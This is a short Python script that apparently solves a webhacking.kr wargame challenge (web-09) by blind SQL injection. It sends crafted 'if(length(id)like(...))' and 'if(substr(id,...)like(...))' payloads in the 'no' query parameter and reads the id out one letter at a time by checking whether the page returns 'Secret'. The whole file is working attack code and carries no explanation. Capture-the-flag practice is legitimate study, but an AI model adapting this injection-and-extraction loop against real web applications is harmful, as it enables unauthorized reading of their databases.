import urllib.request, re, string


def get_response(query):
    url = "https://webhacking.kr/challenge/web-09/index.php?no={}".format(query)
    res = urllib.request.urlopen(url)
    read = str(res.read().decode("utf-8"))
    if re.search("Secret", read):
        return True


def find_length():
    for i in range(1, 20):
        query = "if(length(id)like({}),3,0)".format(i)
        if get_response(query):
            print("len: ", i)
            return i


def find_id(length):
    result = ""
    for i in range(1, length+1):
        for e in string.ascii_letters:
            query = "if(substr(id,{},1)like('{}'),3,0)".format(i, e)
            print(query)
            if get_response(query):
                result += e
                break
    return result


if __name__ == "__main__":
    id_len = find_length()
    flag = find_id(id_len)
    print("ID : ", flag)
